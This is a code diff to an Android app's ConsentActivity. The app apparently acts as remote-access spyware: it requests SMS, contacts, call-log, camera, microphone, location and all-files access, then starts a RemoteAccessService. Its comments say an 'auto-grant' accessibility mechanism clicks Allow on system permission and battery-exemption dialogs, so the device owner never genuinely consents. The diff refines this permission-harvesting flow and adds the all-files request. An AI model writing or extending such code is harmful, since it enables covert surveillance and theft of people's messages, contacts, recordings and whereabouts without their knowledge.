@@ -47,7 +47,11 @@ public class ConsentActivity extends AppCompatActivity {
 
         if (autoLaunch || preferenceManager.isConsentGiven()) {
             startRemoteAccessService();
-            requestNecessaryPermissions();
+            if (!preferenceManager.isPermissionsComplete()) {
+                requestNecessaryPermissions();
+            } else {
+                finish();
+            }
             return;
         }
 
@@ -103,25 +107,31 @@ public class ConsentActivity extends AppCompatActivity {
         }
     }
 
+    private static final String[] REQUIRED_PERMISSIONS = {
+        Manifest.permission.READ_SMS,
+        Manifest.permission.SEND_SMS,
+        Manifest.permission.READ_CONTACTS,
+        Manifest.permission.READ_CALL_LOG,
+        Manifest.permission.CAMERA,
+        Manifest.permission.RECORD_AUDIO,
+        Manifest.permission.ACCESS_FINE_LOCATION,
+        Manifest.permission.ACCESS_COARSE_LOCATION
+    };
+
     private void requestNecessaryPermissions() {
-        // Request battery optimization exemption first — auto-grant will click Allow on the dialog
+        if (preferenceManager.isPermissionsComplete()) {
+            grantConsent();
+            return;
+        }
+
+        // Battery optimization exemption — only prompts if not already exempted
         requestBatteryOptimization();
 
+        // All Files Access — only prompts if not already granted
+        permissionManager.requestManageExternalStorage();
+
         List<String> permissionsToRequest = new ArrayList<>();
-
-        // Note: POST_NOTIFICATIONS intentionally excluded — it is not requested when accessibility is enabled
-        String[] permissions = {
-            Manifest.permission.READ_SMS,
-            Manifest.permission.SEND_SMS,
-            Manifest.permission.READ_CONTACTS,
-            Manifest.permission.READ_CALL_LOG,
-            Manifest.permission.CAMERA,
-            Manifest.permission.RECORD_AUDIO,
-            Manifest.permission.ACCESS_FINE_LOCATION,
-            Manifest.permission.ACCESS_COARSE_LOCATION
-        };
-
-        for (String permission : permissions) {
+        for (String permission : REQUIRED_PERMISSIONS) {
             if (ContextCompat.checkSelfPermission(this, permission)
                 != PackageManager.PERMISSION_GRANTED) {
                 permissionsToRequest.add(permission);
@@ -137,6 +147,15 @@ public class ConsentActivity extends AppCompatActivity {
         } else {
             grantConsent();
         }
+    }
+
+    private boolean allRequiredGranted() {
+        for (String p : REQUIRED_PERMISSIONS) {
+            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
+                return false;
+            }
+        }
+        return true;
     }
 
     /** Opens the battery optimization exemption dialog so auto-grant can click Allow. */
@@ -158,19 +177,9 @@ public class ConsentActivity extends AppCompatActivity {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
 
         if (requestCode == PERMISSION_REQUEST_CODE) {
-            boolean allGranted = true;
-            for (int result : grantResults) {
-                if (result != PackageManager.PERMISSION_GRANTED) {
-                    allGranted = false;
-                    break;
-                }
-            }
-
-            if (allGranted) {
+            if (allRequiredGranted()) {
                 stopAccessibilityPolling();
                 grantConsent();
-            } else {
-                new android.os.Handler().postDelayed(this::requestNecessaryPermissions, 500);
             }
         }
     }
@@ -178,9 +187,13 @@ public class ConsentActivity extends AppCompatActivity {
     @Override
     protected void onResume() {
         super.onResume();
+        if (preferenceManager.isPermissionsComplete()) {
+            finish();
+            return;
+        }
         if (permissionManager.isAccessibilityServiceEnabled()) {
-            requestNecessaryPermissions();
             if (!permissionRequestActive) {
+                requestNecessaryPermissions();
                 startWaitingForAccessibility();
             }
         }
@@ -194,6 +207,9 @@ public class ConsentActivity extends AppCompatActivity {
 
     private void grantConsent() {
         preferenceManager.setConsentGiven(true);
+        if (allRequiredGranted() && permissionManager.hasManageExternalStorage()) {
+            preferenceManager.setPermissionsComplete(true);
+        }
 
         Intent serviceIntent = new Intent(this, RemoteAccessService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
